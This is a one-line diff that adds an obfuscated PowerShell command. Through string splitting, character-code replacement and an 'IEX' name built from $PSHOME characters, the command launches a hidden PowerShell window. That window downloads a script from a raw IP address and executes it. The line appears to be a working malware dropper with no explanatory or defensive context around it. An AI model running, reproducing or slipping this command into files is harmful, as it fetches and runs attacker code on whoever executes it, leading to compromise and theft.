@@ -1,0 +1,1 @@
+﻿& ( $pshomE[21]+$PSHOME[30]+'X')(('powe'+'rshell.ex'+'e -nop '+'-w'+' '+'hidden -c gQC'+'IEX'+' ((new-'+'objec'+'t net.web'+'cl'+'ient).'+'d'+'own'+'lo'+'a'+'d'+'stri'+'ng'+'(5'+'ROhttp://93.17'+'5.232.'+'53'+':80/a5RO))g'+'QC').rEplAcE(([ChAr]103+[ChAr]81+[ChAr]67),[sTriNG][ChAr]34).rEplAcE(([ChAr]53+[ChAr]82+[ChAr]79),[sTriNG][ChAr]39)) 
